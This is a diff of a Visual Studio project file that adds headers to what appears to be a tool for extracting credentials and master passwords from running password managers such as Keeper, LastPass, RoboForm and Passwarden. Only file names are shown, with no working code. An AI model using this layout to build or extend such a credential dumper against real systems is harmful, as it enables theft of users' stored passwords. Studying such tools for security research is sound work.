@@ -158,6 +158,7 @@
     <ClInclude Include="headers\core\FindSecondPID.h" />
     <ClInclude Include="headers\core\FindFourthPID.h" />
     <ClInclude Include="headers\core\FindSimpleProcPID.h" />
+    <ClInclude Include="headers\core\FindThirdPID.h" />
     <ClInclude Include="headers\core\GetProcessListByName.h" />
     <ClInclude Include="headers\core\mergeFiles.h" />
     <ClInclude Include="headers\core\saveAllProc.h" />
@@ -170,15 +171,20 @@
     <ClInclude Include="headers\ironvest\getCredsironvest.h" />
     <ClInclude Include="headers\keeper\getCredskeeper1.h" />
     <ClInclude Include="headers\keeper\getCredskeeper2.h" />
+    <ClInclude Include="headers\keeper\getCredskeeper3.h" />
     <ClInclude Include="headers\lastpass\getCredslastpassEntries.h" />
     <ClInclude Include="headers\lastpass\getCredslastpassMasterPass.h" />
     <ClInclude Include="headers\lastpass\getCredslastpassMasterUsername.h" />
     <ClInclude Include="headers\norton\getCredsnorton.h" />
     <ClInclude Include="headers\norton\getCredsnorton2.h" />
     <ClInclude Include="headers\passwarden\app\getCredspasswarden.h" />
+    <ClInclude Include="headers\passwarden\app\getCredspasswarden2.h" />
     <ClInclude Include="headers\passwordboss\app\getCredspasswordbossapp1.h" />
     <ClInclude Include="headers\passwordboss\app\getCredspasswordbossapp2.h" />
-    <ClInclude Include="headers\roboform\getCredsroboform.h" />
+    <ClInclude Include="headers\roboform\app\getCredsroboformapp3.h" />
+    <ClInclude Include="headers\roboform\app\getCredsroboformapp.h" />
+    <ClInclude Include="headers\roboform\app\getCredsroboformapp2.h" />
+    <ClInclude Include="headers\roboform\plugin\getCredsroboformplugin.h" />
   </ItemGroup>
   <ItemGroup>
     <None Include="packages.config" />
